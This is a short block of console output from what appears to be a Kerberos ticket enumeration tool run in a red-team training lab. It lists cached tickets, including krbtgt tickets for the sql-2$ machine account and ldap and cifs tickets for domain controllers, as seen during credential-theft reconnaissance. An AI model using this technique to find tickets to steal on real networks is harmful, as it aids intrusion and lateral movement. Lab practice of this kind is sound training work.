[*] Current LUID    : 0x3e7

 ---------------------------------------------------------------------------------------------------------------- 
 | LUID     | UserName                   | Service                                       | EndTime              |
 ---------------------------------------------------------------------------------------------------------------- 
 | 0x1cf82f | nlamb @ DEV.CYBERBOTIC.IO  | ldap/dc-2.dev.cyberbotic.io                   | 12/7/2023 5:19:38 AM |
 | 0x3e4    | sql-2$ @ DEV.CYBERBOTIC.IO | krbtgt/DEV.CYBERBOTIC.IO                      | 12/7/2023 5:19:38 AM |
 | 0x3e4    | sql-2$ @ DEV.CYBERBOTIC.IO | ldap/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 12/7/2023 5:19:38 AM |
 | 0x3e4    | sql-2$ @ DEV.CYBERBOTIC.IO | ldap/dc-2.dev.cyberbotic.io                   | 12/7/2023 5:19:38 AM |
 | 0x3e4    | sql-2$ @ DEV.CYBERBOTIC.IO | cifs/dc-2.dev.cyberbotic.io                   | 12/7/2023 5:19:38 AM |
 | 0xf9849  | jking @ DEV.CYBERBOTIC.IO  | cifs/sql-2.dev.cyberbotic.io                  | 12/7/2023 5:27:17 AM |
 | 0x3e7    | sql-2$ @ DEV.CYBERBOTIC.IO | krbtgt/DEV.CYBERBOTIC.IO                      | 12/7/2023 5:19:58 AM |
 | 0x3e7    | sql-2$ @ DEV.CYBERBOTIC.IO | cifs/dc-1.cyberbotic.io/cyberbotic.io         | 12/7/2023 5:19:58 AM |
 | 0x3e7    | sql-2$ @ DEV.CYBERBOTIC.IO | cifs/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 12/7/2023 5:19:58 AM |
 | 0x3e7    | sql-2$ @ DEV.CYBERBOTIC.IO | ldap/dc-1.cyberbotic.io/cyberbotic.io         | 12/7/2023 5:19:58 AM |
 | 0x3e7    | sql-2$ @ DEV.CYBERBOTIC.IO | SQL-2$                                        | 12/7/2023 5:19:58 AM |
 | 0x3e7    | sql-2$ @ DEV.CYBERBOTIC.IO | LDAP/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 12/7/2023 5:19:58 AM |
 | 0x3e7    | sql-2$ @ DEV.CYBERBOTIC.IO | ldap/dc-2.dev.cyberbotic.io                   | 12/7/2023 5:19:58 AM |
 ---------------------------------------------------------------------------------------------------------------- 

```